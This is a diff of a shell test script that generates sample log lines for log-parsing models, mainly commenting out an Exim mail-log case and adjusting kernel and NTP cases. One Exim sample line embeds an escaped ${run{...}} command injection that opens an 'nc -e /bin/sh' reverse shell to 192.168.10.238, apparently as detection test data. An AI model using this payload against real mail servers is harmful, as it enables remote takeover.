@@ -350,55 +350,54 @@ EOL
 #            echo "CRON[13229]: (root) CMD ([ -x /etc/init.d/anacron ] && if [ ! -d /run/systemd/system ]; then /usr/sbin/invoke-rc.d anacron start >/dev/null; fi)" >> $LOG_FILE
 #            echo "CRON[14368]: (root) CMD (   cd / && run-parts --report /etc/cron.hourly)" >> $LOG_FILE
 #            ;;
-        EximGenericParsingModel)
-            echo "2020-02-29 00:04:25 Start queue run: pid=31912" > $LOG_FILE
-            echo "2020-02-29 00:34:25 End queue run: pid=32425" >> $LOG_FILE
-            echo "2020-03-04 19:17:34 no host name found for IP address 192.168.10.238" >> $LOG_FILE
-            echo "2020-03-04 19:21:48 VRFY failed for boyce@cup.com H=(x) [192.168.10.238]" >> $LOG_FILE
-            echo "2020-03-04 19:25:08 1j9Zdk-00029d-Bi <= trula@mail.cup.com U=www-data P=local S=8714 id=20200304192508.Horde.g3OQpszuommgdrQpHrx6wIc@mail.cup.com" >> $LOG_FILE
-            echo "2020-03-04 19:25:08 1j9Zdk-00029d-Bi => irwin <irwin@mail.cup.com> R=local_user T=mail_spool" >> $LOG_FILE
-            echo '2020-03-04 19:36:19 1j9ZoZ-0002Jk-9W ** ${run{\x2fbin\x2fsh\t-c\t\x22nc\t-e\t\x2fbin\x2fsh\t192.168.10.238\t9963\x22}}@localhost: Too many "Received" headers - suspected mail loop' >> $LOG_FILE
-            echo "2020-03-04 19:36:57 1j9ZpB-0002KN-QF Completed" >> $LOG_FILE
-            echo "2020-03-04 20:04:25 1j9ZoZ-0002Jk-9W Message is frozen" >> $LOG_FILE
-            echo "2020-03-04 19:38:19 1j9ZoZ-0002Jk-9W Frozen (delivery error message)" >> $LOG_FILE
-            # following examples are covering exim failure message types. The examples are taken from
-            # https://forums.cpanel.net/resources/reading-and-understanding-the-exim-main_log.383/
-            echo "2014-09-29 21:27:08 1XYdJu-002e6P-9F SMTP error from remote mail server after MAIL FROM:<someone@someaddress.com> SIZE=6601: host mta5.am0.yahoodns.net [66.196.118.240]: 421 4.7.0 [GL01] Message from (184.171.253.133) temporarily deferred - 4.16.50. Please refer to http://postmaster.yahoo.com/errors/postmaster-21.html" >> $LOG_FILE
-            echo "2020-04-28 22:08:03 1m1x23-2011cZ-MN H=mta7.am0.yahoodns.net [67.195.228.106]: SMTP error from remote mail server after pipelined MAIL FROM:<SENDER@senderdomain.com> SIZE=1758: 421 4.7.0 [TSS04] Messages from 184.171.253.133 temporarily deferred due to unexpected volume or user complaints - 4.16.55.1; see https://postmaster.verizonmedia.com/error-codes" >> $LOG_FILE
-            echo "2014-09-12 08:01:12 1XSLn4-003Fa1-OX SMTP error from remote mail server after end of data: host gmail-smtp-in.l.google.com [173.194.66.27]: 421-4.7.0 [77.69.28.195 15] Our system has detected an unusual rate of\n421-4.7.0 unsolicited mail originating from your IP address. To protect our\n421-4.7.0 users from spam, mail sent from your IP address has been temporarily\n421-4.7.0 rate limited. Please visit\n421-4.7.0 http://www.google.com/mail/help/bulk_mail.html to review our Bulk\n421 4.7.0 Email Senders Guidelines. q4si1448293wij.85 - gsmtp" >> $LOG_FILE
-            echo "2014-09-18 13:44:19 1XUb4M-000v5R-6R SMTP error from remote mail server after MAIL FROM:<someone@someaddress.com> SIZE=1811: host mta7.am0.yahoodns.net [66.66.66.66]: 421 4.7.1 [TS03] All messages from 5.196.113.212 will be permanently deferred; Retrying will NOT succeed. See http://postmaster.yahoo.com/421-ts03.html" >> $LOG_FILE
-            echo "TO:<someone@someaddress>: host mx.someaddress.com [20.20.20.20]: 450 4.7.1 Client host rejected: cannot find your hostname, [20.20.20.20] 2014-09-21 16:06:05 1XUKFa-0003bb-EM ** someone@someaddress>: retry timeout exceeded" >> $LOG_FILE
-            echo "2014-10-10 10:25:01 1XcKLM-003IGU-Fr SMTP error from remote mail server after RCPT TO:<ma@bol.com>: host pro-mail-mx-002.bol.com [20.20.20.20]: 450 4.7.1 Service unavailable" >> $LOG_FILE
-            echo "2014-09-24 12:59:49 1XWqqy-00028x-FK == test@badluckbryan.com R=lookuphost T=remote_smtp defer (-44): SMTP error from remote mail server after RCPT TO:<test@gylsystems.com>: host gylsystems.com [69.69.69.69]: 451 Temporary local problem - please try later" >> $LOG_FILE
-            echo "2014-11-24 11:25:33 H=localhost (mail.fictional.example) [::1]:49956 sender verify defer for <aaron@domain.com>: require_files: error for /home/aaron/etc/domain.com: Permission denied" >> $LOG_FILE
-            echo "2014-11-24 11:25:33 H=localhost (srv-hs1.netsons.net) [::1]:49956 F=<aaron@domain.com> A=dovecot_login:aaron@domain.com temporarily rejected RCPT <test@pleasecheck.net>: Could not complete sender verify" >> $LOG_FILE
-            echo "2014-09-13 11:37:53 1XSdCz-00049U-5A ==aaron@domain.com R=lookuphost T=remote_smtp defer (-44): SMTP error from remote mail server after RCPT TO:<aaron@domain.com>: host mail.fictional.example [10.5.40.204]: 452 <aron@domain.com> Domain size limit exceeded" >> $LOG_FILE
-            echo "2014-08-31 08:43:16 1XO5PX-0006SC-Qa ** aaron@domain.com R=dkim_lookuphost T=dkim_remote_smtp: SMTP error from remote mail server after RCPT TO:<aaron@domain.com>: host mail.domain.com [10.5.40.204]: 550-Verification for <garfield@domain.com>\n550-The mail server could not deliver mail to garfield@domain.com. The account or domain may not exist, they may be blacklisted, or missing the proper dns entries.\n550 Sender verify failed" >> $LOG_FILE
-            echo "SMTP error from remote mail server after RCPT TO:: host mail.fictional.example[10.5.40.204]: 550-Sender has no A, AAAA, or MX DNS records. mail.fictional.example\n550 l mail.fictional.example\nVerify the zone file in /etc/named for the correct information. If it appear correct, you can run named-checkzone domain.com domain.com.db to verify if named is able to load the zone." >> $LOG_FILE
-            echo "Diagnostic-Code: X-Postfix; host mail1.domain.com [10.5.40.204] said: 550 5.7.1 Message rejected due to content restrictions (in reply to end of DATA command)\nWhen you see an error such as 550 5.7.1" >> $LOG_FILE
-            echo "Final-Recipient: rfc822;aaron@domain.com\nAction: failed\nStatus: 5.5.0\nDiagnostic-Code: smtp;550-Please turn on SMTP Authentication in your mail client.\n550-mail.fictional.example [10.5.40.204]:58133 is not permitted to relay 550 through this server without authentication." >> $LOG_FILE
-            echo "DHE-RSA-AES256-SHA:256: SMTP error from remote mail server after MAIL FROM:<aaron@domain.com> SIZE=1834: host mail.fictional.example [10.5.40.204..212]: 550 \"REJECTED - Bad HELO - Host impersonating [mail.fictional2.example]\"" >> $LOG_FILE
-            echo "2014-08-31 08:43:16 1XO5PY-0006SO-GS <= <> R=1XO5PX-0006SC-Qa U=mailnull P=local S=1951 T=\"Mail delivery failed: returning message to sender\" for aaron@domain.com" >> $LOG_FILE
-            echo "SMTP error from remote mail server after MAIL FROM:<aaron@domain.com>: host mail.fictional.example [10.5.40.204]: 553 sorry, your domain does not exists." >> $LOG_FILE
-            echo "2014-11-26 10:26:32 1XtYro-004Ecv-65 ** aaron@domain.com R=dkim_lookuphost T=dkim_remote_smtp: SMTP error from remote mail server after MAIL FROM:<aaron@domain.com> SIZE=1604: host mail.fictional.example [10.5.40.204]: 553 <aaron@domain.com> unable to verify address\nVerify that SMPT authentication has been enabled." >> $LOG_FILE
-            echo "[15:03:30 hosts5 root /var/log]cPs# grep 1XeRdP-0006JC-FO exim_mainlog 2014-10-15 12:41:11 1XeRdP-0006JC-FO <= <> R=1XeRdF-0006HI-EY U=mailnull P=local S=5445 T=\"Mail delivery failed: returning message to sender\" for aaron@domain.com 2014-10-15 12:41:11 cwd=/var/spool/exim 3 args: /usr/sbin/exim -Mc 1XeRdP-0006JC-FO 2014-10-15 12:42:12 1XeRdP-0006JC-FO ** aaron@domain.com R=dkim_lookuphost T=dkim_remote_smtp: SMTP error from remote mail server after end of data: host mail.fictional.example [10.5.40.204]: 554 rejected due to spam content" >> $LOG_FILE
-            echo "2014-10-01 15:12:26 1XZKdg-0001g3-JS H=mail.fictional.example [10.5.40.204]:4779 Warning: \"SpamAssassin as marka22 detected message as spam (11.0)\"" >> $LOG_FILE
-            echo "2014-10-01 15:12:26 1XZKdg-0001g3-JS <=10.5.40.204 H=mail.fictional.example[10.5.40.204]:4779 P=esmtp S=491878 id=dos45yx4zbmri7f@domain.com T="Payment confirmation: 7037487121" for aaron@domain.net [" >> $LOG_FILE
-            echo "2014-10-01 15:12:26 1XZKdg-0001g3-JS => aaron  <aaron@domain.net [> R=virtual_user_spam T=virtual_userdelivery_spam" >> $LOG_FILE
-            echo "2014-10-01 15:12:26 1XZKdg-0001g3-JS Completed 2014-10-01 15:30:35 1XZKvG-0002HW-ML H=(12-12-12-12.domain.net [10.5.40.204]:65376 Warning: \"SpamAssassin as marka22 detected message as spam (7.2)\"" >> $LOG_FILE
-            echo "2014-10-01 15:30:35 1XZKvG-0002HW-ML <= item@something.net H=(12-12-12-12.domain.net [10.5.40.204]:65376 P=esmtp S=519381 id=dos45yx4zbmri7f@domain.com T=\"Payment confirmation: 7037487121\" for mark@domain.com 2014-10-01 15:30:35 1XZKvG-0002HW-ML => mark <mark@domain.net [> R=virtual_user_spam T=virtual_userdelivery_spam" >> $LOG_FILE
-            echo "2014-10-01 15:30:35 1XZKvG-0002HW-ML Completed" >> $LOG_FILE
-            echo "2014-09-10 13:06:55 1XRlM6-003yMv-KG H=mail.fictional.example[10.5.40.204]:46793 Warning: Message has been scanned: no virus or other harmful content was found" >> $LOG_FILE
-            echo "2014-09-10 13:06:56 1XRlM6-003yMv-KG H=mail.fictional.example[10.5.40.204]:46793 Warning: \"SpamAssassin as cpaneleximscanner detected OUTGOING smtp message as NOT spam (-0.1)\"" >> $LOG_FILE
-            echo "2014-09-10 13:06:56 1XRlM6-003yMv-KG <= bob@bob.com H=mail.fictional.example [10.5.40.204]:46793 P=esmtpsa X=TLSv1:AES128-SHA:128 A=dovecot_login:aaron@domain.com S=18635 T=\"14\\\" plates\" for live@somedomain.com" >> $LOG_FILE
-            echo "2014-09-10 13:06:56 1XRlM6-003yMv-KG SMTP connection outbound 1410368816 1XRlM6-003yMv-KG domain.com live@somedomain.com" >> $LOG_FILE
-            echo "2014-09-10 13:07:22 1XRlM6-003yMv-KG => live@somedomain.com R=dkim_lookuphost T=dkim_remote_smtp H=mail.fictional.example [10.5.40.204] X=TLSv1:DHE-RSA-AES256-SHA:256 C=\"250 OK id=1XRlMC-0006w5-F4\" 2014-09-10 13:07:22 1XRlM6-003yMv-KG Completed" >> $LOG_FILE
-            echo "2014-11-06 09:14:13 1XmNp0-0005Qp-MR H=mail-qg0-f68.google.com [10.5.40.204]:42603 Warning: \"SpamAssassin as sfgthib detected message as spam (998.0)\" 2014-11-06 09:14:13 1XmNp0-0005Qp-MR H=mail-qg0-f68.google.com [10.5.40.204]:42603 Warning: Message has been scanned: no virus or other harmful content was found" >> $LOG_FILE
-            echo "2014-11-06 09:14:13 1XmNp0-0005Qp-MR <= cpaneltest@gmail.com H=mail.fictional.example [10.5.40.204]:42603 P=esmtps X=TLSv1:RC4-SHA:128 S=3411 id=CAPtYmmQYRDb38yTmnA_ULZVjnKVOdtu6yw-HapGmjBCAk6rYYw@mail.gmail.com T=\"test\" for aaron@domain.com" >> $LOG_FILE
-            ;;
+#        EximGenericParsingModel)
+#            echo "2020-02-29 00:04:25 Start queue run: pid=31912" > $LOG_FILE
+#            echo "2020-02-29 00:34:25 End queue run: pid=32425" >> $LOG_FILE
+#            echo "2020-03-04 19:17:34 no host name found for IP address 192.168.10.238" >> $LOG_FILE
+#            echo "2020-03-04 19:21:48 VRFY failed for boyce@cup.com H=(x) [192.168.10.238]" >> $LOG_FILE
+#            echo "2020-03-04 19:25:08 1j9Zdk-00029d-Bi <= trula@mail.cup.com U=www-data P=local S=8714 id=20200304192508.Horde.g3OQpszuommgdrQpHrx6wIc@mail.cup.com" >> $LOG_FILE
+#            echo "2020-03-04 19:25:08 1j9Zdk-00029d-Bi => irwin <irwin@mail.cup.com> R=local_user T=mail_spool" >> $LOG_FILE
+#            echo '2020-03-04 19:36:19 1j9ZoZ-0002Jk-9W ** ${run{\x2fbin\x2fsh\t-c\t\x22nc\t-e\t\x2fbin\x2fsh\t192.168.10.238\t9963\x22}}@localhost: Too many "Received" headers - suspected mail loop' >> $LOG_FILE
+#            echo "2020-03-04 19:36:57 1j9ZpB-0002KN-QF Completed" >> $LOG_FILE
+#            echo "2020-03-04 20:04:25 1j9ZoZ-0002Jk-9W Message is frozen" >> $LOG_FILE
+#            echo "2020-03-04 19:38:19 1j9ZoZ-0002Jk-9W Frozen (delivery error message)" >> $LOG_FILE
+#            # following examples are covering exim failure message types. The examples are taken from
+#            # https://forums.cpanel.net/resources/reading-and-understanding-the-exim-main_log.383/
+#            echo "2014-09-29 21:27:08 1XYdJu-002e6P-9F SMTP error from remote mail server after MAIL FROM:<someone@someaddress.com> SIZE=6601: host mta5.am0.yahoodns.net [66.196.118.240]: 421 4.7.0 [GL01] Message from (184.171.253.133) temporarily deferred - 4.16.50. Please refer to http://postmaster.yahoo.com/errors/postmaster-21.html" >> $LOG_FILE
+#            echo "2020-04-28 22:08:03 1m1x23-2011cZ-MN H=mta7.am0.yahoodns.net [67.195.228.106]: SMTP error from remote mail server after pipelined MAIL FROM:<SENDER@senderdomain.com> SIZE=1758: 421 4.7.0 [TSS04] Messages from 184.171.253.133 temporarily deferred due to unexpected volume or user complaints - 4.16.55.1; see https://postmaster.verizonmedia.com/error-codes" >> $LOG_FILE
+#            echo "2014-09-12 08:01:12 1XSLn4-003Fa1-OX SMTP error from remote mail server after end of data: host gmail-smtp-in.l.google.com [173.194.66.27]: 421-4.7.0 [77.69.28.195 15] Our system has detected an unusual rate of\n421-4.7.0 unsolicited mail originating from your IP address. To protect our\n421-4.7.0 users from spam, mail sent from your IP address has been temporarily\n421-4.7.0 rate limited. Please visit\n421-4.7.0 http://www.google.com/mail/help/bulk_mail.html to review our Bulk\n421 4.7.0 Email Senders Guidelines. q4si1448293wij.85 - gsmtp" >> $LOG_FILE
+#            echo "2014-09-18 13:44:19 1XUb4M-000v5R-6R SMTP error from remote mail server after MAIL FROM:<someone@someaddress.com> SIZE=1811: host mta7.am0.yahoodns.net [66.66.66.66]: 421 4.7.1 [TS03] All messages from 5.196.113.212 will be permanently deferred; Retrying will NOT succeed. See http://postmaster.yahoo.com/421-ts03.html" >> $LOG_FILE
+#            echo "TO:<someone@someaddress>: host mx.someaddress.com [20.20.20.20]: 450 4.7.1 Client host rejected: cannot find your hostname, [20.20.20.20] 2014-09-21 16:06:05 1XUKFa-0003bb-EM ** someone@someaddress>: retry timeout exceeded" >> $LOG_FILE
+#            echo "2014-10-10 10:25:01 1XcKLM-003IGU-Fr SMTP error from remote mail server after RCPT TO:<ma@bol.com>: host pro-mail-mx-002.bol.com [20.20.20.20]: 450 4.7.1 Service unavailable" >> $LOG_FILE
+#            echo "2014-09-24 12:59:49 1XWqqy-00028x-FK == test@badluckbryan.com R=lookuphost T=remote_smtp defer (-44): SMTP error from remote mail server after RCPT TO:<test@gylsystems.com>: host gylsystems.com [69.69.69.69]: 451 Temporary local problem - please try later" >> $LOG_FILE
+#            echo "2014-11-24 11:25:33 H=localhost (mail.fictional.example) [::1]:49956 sender verify defer for <aaron@domain.com>: require_files: error for /home/aaron/etc/domain.com: Permission denied" >> $LOG_FILE
+#            echo "2014-11-24 11:25:33 H=localhost (srv-hs1.netsons.net) [::1]:49956 F=<aaron@domain.com> A=dovecot_login:aaron@domain.com temporarily rejected RCPT <test@pleasecheck.net>: Could not complete sender verify" >> $LOG_FILE
+#            echo "2014-09-13 11:37:53 1XSdCz-00049U-5A ==aaron@domain.com R=lookuphost T=remote_smtp defer (-44): SMTP error from remote mail server after RCPT TO:<aaron@domain.com>: host mail.fictional.example [10.5.40.204]: 452 <aron@domain.com> Domain size limit exceeded" >> $LOG_FILE
+#            echo "2014-08-31 08:43:16 1XO5PX-0006SC-Qa ** aaron@domain.com R=dkim_lookuphost T=dkim_remote_smtp: SMTP error from remote mail server after RCPT TO:<aaron@domain.com>: host mail.domain.com [10.5.40.204]: 550-Verification for <garfield@domain.com>\n550-The mail server could not deliver mail to garfield@domain.com. The account or domain may not exist, they may be blacklisted, or missing the proper dns entries.\n550 Sender verify failed" >> $LOG_FILE
+#            echo "SMTP error from remote mail server after RCPT TO:: host mail.fictional.example[10.5.40.204]: 550-Sender has no A, AAAA, or MX DNS records. mail.fictional.example\n550 l mail.fictional.example\nVerify the zone file in /etc/named for the correct information. If it appear correct, you can run named-checkzone domain.com domain.com.db to verify if named is able to load the zone." >> $LOG_FILE
+#            echo "Diagnostic-Code: X-Postfix; host mail1.domain.com [10.5.40.204] said: 550 5.7.1 Message rejected due to content restrictions (in reply to end of DATA command)\nWhen you see an error such as 550 5.7.1" >> $LOG_FILE
+#            echo "Final-Recipient: rfc822;aaron@domain.com\nAction: failed\nStatus: 5.5.0\nDiagnostic-Code: smtp;550-Please turn on SMTP Authentication in your mail client.\n550-mail.fictional.example [10.5.40.204]:58133 is not permitted to relay 550 through this server without authentication." >> $LOG_FILE
+#            echo "DHE-RSA-AES256-SHA:256: SMTP error from remote mail server after MAIL FROM:<aaron@domain.com> SIZE=1834: host mail.fictional.example [10.5.40.204..212]: 550 \"REJECTED - Bad HELO - Host impersonating [mail.fictional2.example]\"" >> $LOG_FILE
+#            echo "2014-08-31 08:43:16 1XO5PY-0006SO-GS <= <> R=1XO5PX-0006SC-Qa U=mailnull P=local S=1951 T=\"Mail delivery failed: returning message to sender\" for aaron@domain.com" >> $LOG_FILE
+#            echo "SMTP error from remote mail server after MAIL FROM:<aaron@domain.com>: host mail.fictional.example [10.5.40.204]: 553 sorry, your domain does not exists." >> $LOG_FILE
+#            echo "2014-11-26 10:26:32 1XtYro-004Ecv-65 ** aaron@domain.com R=dkim_lookuphost T=dkim_remote_smtp: SMTP error from remote mail server after MAIL FROM:<aaron@domain.com> SIZE=1604: host mail.fictional.example [10.5.40.204]: 553 <aaron@domain.com> unable to verify address\nVerify that SMPT authentication has been enabled." >> $LOG_FILE
+#            echo "[15:03:30 hosts5 root /var/log]cPs# grep 1XeRdP-0006JC-FO exim_mainlog 2014-10-15 12:41:11 1XeRdP-0006JC-FO <= <> R=1XeRdF-0006HI-EY U=mailnull P=local S=5445 T=\"Mail delivery failed: returning message to sender\" for aaron@domain.com 2014-10-15 12:41:11 cwd=/var/spool/exim 3 args: /usr/sbin/exim -Mc 1XeRdP-0006JC-FO 2014-10-15 12:42:12 1XeRdP-0006JC-FO ** aaron@domain.com R=dkim_lookuphost T=dkim_remote_smtp: SMTP error from remote mail server after end of data: host mail.fictional.example [10.5.40.204]: 554 rejected due to spam content" >> $LOG_FILE
+#            echo "2014-10-01 15:12:26 1XZKdg-0001g3-JS H=mail.fictional.example [10.5.40.204]:4779 Warning: \"SpamAssassin as marka22 detected message as spam (11.0)\"" >> $LOG_FILE
+#            echo "2014-10-01 15:12:26 1XZKdg-0001g3-JS <=10.5.40.204 H=mail.fictional.example[10.5.40.204]:4779 P=esmtp S=491878 id=dos45yx4zbmri7f@domain.com T="Payment confirmation: 7037487121" for aaron@domain.net [" >> $LOG_FILE
+#            echo "2014-10-01 15:12:26 1XZKdg-0001g3-JS => aaron  <aaron@domain.net [> R=virtual_user_spam T=virtual_userdelivery_spam" >> $LOG_FILE
+#            echo "2014-10-01 15:12:26 1XZKdg-0001g3-JS Completed 2014-10-01 15:30:35 1XZKvG-0002HW-ML H=(12-12-12-12.domain.net [10.5.40.204]:65376 Warning: \"SpamAssassin as marka22 detected message as spam (7.2)\"" >> $LOG_FILE
+#            echo "2014-10-01 15:30:35 1XZKvG-0002HW-ML <= item@something.net H=(12-12-12-12.domain.net [10.5.40.204]:65376 P=esmtp S=519381 id=dos45yx4zbmri7f@domain.com T=\"Payment confirmation: 7037487121\" for mark@domain.com 2014-10-01 15:30:35 1XZKvG-0002HW-ML => mark <mark@domain.net [> R=virtual_user_spam T=virtual_userdelivery_spam" >> $LOG_FILE
+#            echo "2014-10-01 15:30:35 1XZKvG-0002HW-ML Completed" >> $LOG_FILE
+#            echo "2014-09-10 13:06:55 1XRlM6-003yMv-KG H=mail.fictional.example[10.5.40.204]:46793 Warning: Message has been scanned: no virus or other harmful content was found" >> $LOG_FILE
+#            echo "2014-09-10 13:06:56 1XRlM6-003yMv-KG H=mail.fictional.example[10.5.40.204]:46793 Warning: \"SpamAssassin as cpaneleximscanner detected OUTGOING smtp message as NOT spam (-0.1)\"" >> $LOG_FILE
+#            echo "2014-09-10 13:06:56 1XRlM6-003yMv-KG <= bob@bob.com H=mail.fictional.example [10.5.40.204]:46793 P=esmtpsa X=TLSv1:AES128-SHA:128 A=dovecot_login:aaron@domain.com S=18635 T=\"14\\\" plates\" for live@somedomain.com" >> $LOG_FILE
+#            echo "2014-09-10 13:06:56 1XRlM6-003yMv-KG SMTP connection outbound 1410368816 1XRlM6-003yMv-KG domain.com live@somedomain.com" >> $LOG_FILE
+#            echo "2014-09-10 13:07:22 1XRlM6-003yMv-KG => live@somedomain.com R=dkim_lookuphost T=dkim_remote_smtp H=mail.fictional.example [10.5.40.204] X=TLSv1:DHE-RSA-AES256-SHA:256 C=\"250 OK id=1XRlMC-0006w5-F4\" 2014-09-10 13:07:22 1XRlM6-003yMv-KG Completed" >> $LOG_FILE
+#            echo "2014-11-06 09:14:13 1XmNp0-0005Qp-MR H=mail-qg0-f68.google.com [10.5.40.204]:42603 Warning: \"SpamAssassin as sfgthib detected message as spam (998.0)\" 2014-11-06 09:14:13 1XmNp0-0005Qp-MR H=mail-qg0-f68.google.com [10.5.40.204]:42603 Warning: Message has been scanned: no virus or other harmful content was found" >> $LOG_FILE
+#            echo "2014-11-06 09:14:13 1XmNp0-0005Qp-MR <= cpaneltest@gmail.com H=mail.fictional.example [10.5.40.204]:42603 P=esmtps X=TLSv1:RC4-SHA:128 S=3411 id=CAPtYmmQYRDb38yTmnA_ULZVjnKVOdtu6yw-HapGmjBCAk6rYYw@mail.gmail.com T=\"test\" for aaron@domain.com" >> $LOG_FILE
+#            ;;
         KernelMsgParsingModel)
-            exit $exit_code
-            echo "test13" > $LOG_FILE
+            echo "kernel: martian source 192.168.12.197 from 192.168.12.198, on dev bondib0" > $LOG_FILE
 #            echo "" >> $LOG_FILE
 #            echo "" >> $LOG_FILE
 #            echo "" >> $LOG_FILE
@@ -408,6 +407,7 @@ EOL
 #            echo "" >> $LOG_FILE
             ;;
         NtpParsingModel)
+            exit $exit_code
             echo "test14" > $LOG_FILE
             ;;
         RsyslogParsingModel)
